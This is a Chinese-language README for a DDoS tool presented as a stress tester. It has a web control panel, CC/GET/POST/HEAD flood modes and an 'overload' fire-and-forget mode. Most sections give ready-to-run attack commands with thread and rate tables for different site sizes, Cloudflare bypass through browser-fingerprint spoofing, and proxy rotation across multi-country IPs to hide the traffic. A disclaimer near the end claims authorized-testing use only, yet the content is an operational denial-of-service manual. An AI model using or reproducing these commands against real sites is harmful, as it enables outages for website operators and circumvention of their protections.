# 🚀 DDoS压测工具 - 超负荷增强版

[![Python版本](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://python.org)
[![许可证](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![状态](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()

> **专业级DDoS压力测试工具，支持Web控制面板、超负荷模式、Cloudflare绕过等高级功能**

## 📋 目录

- [功能特点](#功能特点)
- [一键安装](#一键安装)
- [快速开始](#快速开始)
- [Web控制面板](#web控制面板)
- [命令行使用](#命令行使用)
- [超负荷模式](#超负荷模式)
- [Cloudflare绕过](#cloudflare绕过)
- [代理配置](#代理配置)
- [性能优化](#性能优化)
- [系统服务](#系统服务)
- [依赖说明](#依赖说明)
- [故障排除](#故障排除)

## 🌟 功能特点

### 🌐 Web控制面板
- **📊 实时监控**: CPU、内存、网络流量图表显示
- **📝 任务管理**: 创建、启动、停止、监控压测任务
- **📜 实时日志**: WebSocket推送，支持下载导出
- **⏱️ 定时任务**: 支持定时启动和自动停止
- **🔧 参数配置**: 图形化配置所有攻击参数

### ⚡ 超负荷模式
- **🔥 纯发送模式**: 只发送不接收，RPS提升500%+
- **🏊 连接池**: 智能连接复用，降低80%开销
- **💾 内存优化**: 激进垃圾回收，请求缓存复用
- **💥 爆发模式**: 动态扩展worker，峰值性能
- **⚡ 无延迟**: 移除所有等待，极限速度

### 🛡️ Cloudflare绕过
- **🌐 浏览器模拟**: Chrome最新版完整指纹
- **🔐 TLS优化**: 现代加密套件和协议
- **📦 分片传输**: 模拟真实网络行为
- **🎯 智能参数**: 真实时间戳和referrer

### 🔧 高级功能
- **📡 多代理类型**: SOCKS5/4、HTTP代理支持
- **📂 配置文件**: 300+ headers，400+ referers
- **🔄 自动重试**: 智能故障恢复机制
- **📈 统计分析**: 详细性能数据报告

## 🚀 一键安装

### 自动安装（推荐）
```bash
# 克隆项目
git clone https://github.com/wudi2898/cc-main.git
cd cc-main

# 一键安装（需要root权限）
sudo chmod +x install.sh
sudo ./install.sh
```

**安装完成后自动启动Web面板**: http://localhost:5000

### 安装功能
- ✅ 自动安装所有依赖
- ✅ 创建系统服务
- ✅ 配置开机自启
- ✅ 系统网络优化
- ✅ 创建管理命令
- ✅ 安全权限设置

## 🚀 快速开始

### 快速安装（推荐）
```bash
# 仅安装核心依赖，快速启动
./quick_install.sh
```

### 手动安装
```bash
# 安装Python依赖
pip3 install -r requirements.txt

# 最小安装（仅核心功能）
pip3 install -r requirements-minimal.txt

# 设置权限
chmod +x *.py *.sh

# 配置代理（必需）
echo "127.0.0.1:1080" > config/socks5.txt
```

## 🌐 Web控制面板

### 启动面板
```bash
python3 web_panel.py
```

**🌍 访问地址**: http://localhost:5000

### 面板功能

#### 📊 系统监控
- **CPU使用率**: 实时图表显示
- **内存状态**: 使用量和可用量
- **网络流量**: 上传/下载速度
- **连接统计**: 当前连接数

#### 📝 任务管理
```javascript
// 创建超负荷任务示例
{
  "mode": "cc",
  "url": "https://target.com",
  "threads": 2000,
  "rps": 200,
  "duration": 300,
  "cf_bypass": true,
  "overload": true,
  "fire_and_forget": true
}
```

#### 📜 实时日志
- WebSocket实时推送
- 任务日志隔离查看
- 支持日志下载导出
- 错误信息高亮显示

## 💻 命令行使用

### 基础攻击
```bash
# CC攻击
python3 main.py cc https://target.com 100 10

# GET洪水
python3 main.py get https://target.com 200 20

# POST攻击
python3 main.py post https://target.com 150 15

# HEAD请求
python3 main.py head https://target.com 100 10
```

### 高级配置
```bash
# 完整参数示例
python3 main.py cc https://target.com 500 50 \
  --proxy-type socks5 \
  --proxy-file socks5.txt \
  --cookies "session=abc123; token=xyz789" \
  --timeout 15 \
  --duration 300 \
  --cf-bypass \
  --overload \
  --fire-and-forget \
  --burst \
  --no-delay \
  --max-connections 5000 \
  --connections-per-proxy 100
```

## ⚡ 超负荷模式

### 纯发送模式
```bash
# 极限RPS - 只发送不接收
python3 main.py cc https://target.com 1000 100 --fire-and-forget
```

**优势**:
- RPS提升 **500%+**
- CPU占用降低 **60%**
- 内存使用减少 **40%**

### 完整超负荷
```bash
# 所有优化开启
python3 main.py cc https://target.com 2000 200 \
  --overload \
  --fire-and-forget \
  --burst \
  --no-delay \
  --max-connections 5000
```

### 性能对比

| 模式 | RPS | CPU使用 | 内存占用 | 适用场景 |
|------|-----|---------|----------|----------|
| 标准模式 | 1000 | 80% | 512MB | 常规测试 |
| 超负荷模式 | 5000+ | 70% | 300MB | 高强度测试 |
| 极限模式 | 10000+ | 90% | 200MB | 最大压力 |

## 🛡️ Cloudflare绕过

### 基础绕过
```bash
python3 main.py cc https://cf-protected.com 100 10 --cf-bypass
```

### 高级绕过
```bash
# CF绕过 + 超负荷组合
python3 main.py cc https://cf-protected.com 300 30 \
  --cf-bypass \
  --fire-and-forget \
  --cookies "cf_clearance=xxx" \
  --duration 600
```

### 绕过技术

#### 🌐 浏览器指纹模拟
```http
sec-ch-ua: "Chromium";v="110", "Not A(Brand)";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: cross-site
sec-fetch-user: ?1
```

#### 🔐 TLS优化
```python
# 现代加密套件
ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20')
ctx.minimum_version = ssl.TLSVersion.TLSv1_2

# TCP优化
socket.TCP_NODELAY = 1
socket.SO_KEEPALIVE = 1
```

#### 📦 行为模拟
- **真实参数**: 时间戳、版本号、来源
- **分片传输**: 模拟浏览器网络行为
- **随机化**: Headers顺序和内容

## 📡 代理配置

### SOCKS5代理 (推荐)
```bash
# config/socks5.txt 格式
127.0.0.1:1080
192.168.1.100:1080
proxy.example.com:1080
```

**优势**:
- 连接速度快 **3-5倍**
- CPU占用低 **30%**
- 支持TCP/UDP
- 隐蔽性更强

### HTTP代理
```bash
# 使用HTTP代理
python3 main.py cc https://target.com 100 10 \
  --proxy-type http \
  --http-proxy-file config/http_proxies.txt
```

### 代理配置示例
```bash
# 编辑SOCKS5代理
nano config/socks5.txt

# 编辑HTTP代理
nano config/http_proxies.txt

# 编辑请求头
nano config/accept_headers.txt

# 编辑引用页
nano config/referers.txt
```

## 🎯 性能优化

### 线程配置建议

| 目标类型 | 线程数 | RPS | 模式建议 |
|----------|--------|-----|----------|
| 小型站点 | 50-200 | 5-15 | 标准模式 |
| 中型站点 | 200-500 | 10-25 | 超负荷模式 |
| 大型站点 | 500-2000 | 15-50 | 纯发送模式 |
| CF保护 | 100-300 | 5-20 | CF绕过模式 |
| 极限测试 | 1000-5000 | 50-200 | 所有优化 |

### 代理质量要求
- **延迟**: < 500ms
- **稳定性**: > 95%
- **带宽**: > 10Mbps
- **地理分布**: 多国IP

### 系统优化
```bash
# Linux系统优化
echo 'net.core.somaxconn = 65535' >> /etc/sysctl.conf
echo 'net.ipv4.ip_local_port_range = 1024 65535' >> /etc/sysctl.conf
sysctl -p

# 文件描述符限制
ulimit -n 65535
```

## 🔧 系统服务

### 服务管理命令
```bash
# 启动服务
cc-start

# 停止服务
cc-stop

# 重启服务
cc-restart

# 查看状态
cc-status

# 查看日志
cc-logs
```

### 开机自启
安装后自动配置开机自启，无需手动设置。

### 服务配置
- **安装目录**: `/opt/cc-main`
- **运行用户**: `cc-main`
- **Web端口**: `5000`
- **配置目录**: `/opt/cc-main/config`
- **日志目录**: `/opt/cc-main/logs`

### 手动启动Web面板
```bash
# 使用启动脚本
./start_panel.sh

# 直接启动
python3 web_panel.py

# 后台启动
./start_panel.sh -b

# 调试模式
./start_panel.sh -d
```

### 卸载工具
```bash
# 完全卸载
sudo ./uninstall.sh
```

## 📦 依赖说明

### 核心依赖
- **flask==2.3.3** - Web框架
- **flask-socketio==5.3.6** - WebSocket支持
- **psutil==5.9.5** - 系统监控
- **PySocks==1.7.1** - SOCKS代理支持

### 完整依赖
```bash
# 安装所有依赖
pip install -r requirements.txt
```

### 最小依赖
```bash
# 仅核心功能
pip install -r requirements-minimal.txt
```

### 依赖详情
详细的依赖说明请查看 [DEPENDENCIES.md](DEPENDENCIES.md)

## 📊 监控和统计

### 实时监控
```bash
# Web面板监控
python3 web_panel.py

# 命令行监控
watch -n 1 'ps aux | grep main.py'
```

### 性能指标
- **RPS**: 每秒请求数
- **成功率**: 请求成功百分比
- **响应时间**: 平均响应延迟
- **资源使用**: CPU、内存、网络

### 日志分析
```bash
# 查看攻击日志
tail -f attack.log

# 统计成功率
grep "成功" attack.log | wc -l
```

## 🔧 故障排除

### 常见问题

#### 1. 依赖安装问题
```bash
# PySocks未安装
pip install PySocks

# Flask组件缺失
pip install flask flask-socketio psutil
```

#### 2. 代理连接失败
```bash
# 检查代理可用性
python3 main.py check https://httpbin.org/ip 100 10

# 测试代理性能
python3 proxy_benchmark.py
```

#### 3. CF绕过效果差
```bash
# 降低攻击强度
python3 main.py cc https://cf-site.com 50 5 --cf-bypass

# 增加请求间隔
python3 main.py cc https://cf-site.com 100 10 --cf-bypass --timeout 20
```

#### 4. 性能不佳
```bash
# 内存不足
--max-connections 1000 --connections-per-proxy 20

# CPU过载
减少线程数，降低RPS设置

# 网络瓶颈
使用更高质量代理，检查带宽
```

### 调试模式
```bash
# 详细日志输出
python3 main.py cc https://target.com 100 10 --debug

# 性能分析
python3 performance_test.py
```

## ⚠️ 免责声明

**重要提醒**: 此工具仅用于授权的安全测试和性能测试

### 合法使用要求
1. ✅ 获得目标系统明确授权
2. ✅ 遵守当地法律法规
3. ✅ 用于安全研究和测试
4. ✅ 承担使用后果和责任

### 禁止用途
1. ❌ 未授权的攻击行为
2. ❌ 恶意破坏或损害
3. ❌ 商业竞争攻击
4. ❌ 任何违法犯罪活动

## 📝 更新日志

### v3.0.0 (最新)
- ✅ 全新超负荷模式
- ✅ 纯发送技术
- ✅ 连接池优化
- ✅ CF绕过增强
- ✅ Web面板重构
- ✅ 多代理类型支持

### v2.0.0
- ✅ Web控制面板
- ✅ 实时监控
- ✅ Cloudflare绕过
- ✅ 配置文件支持

### v1.0.0
- ✅ 基础攻击功能
- ✅ 多攻击模式
- ✅ 代理池支持

## 🤝 贡献

欢迎提交Issue和Pull Request来改进此项目！

## 📄 许可证

MIT License - 详见 [LICENSE](LICENSE) 文件

---

**⭐ 如果这个项目对您有帮助，请给个星标支持！**

**📧 技术支持**: support@example.com  
**🌐 项目主页**: https://github.com/your-repo/ddos-tool  
**📖 详细文档**: https://docs.example.com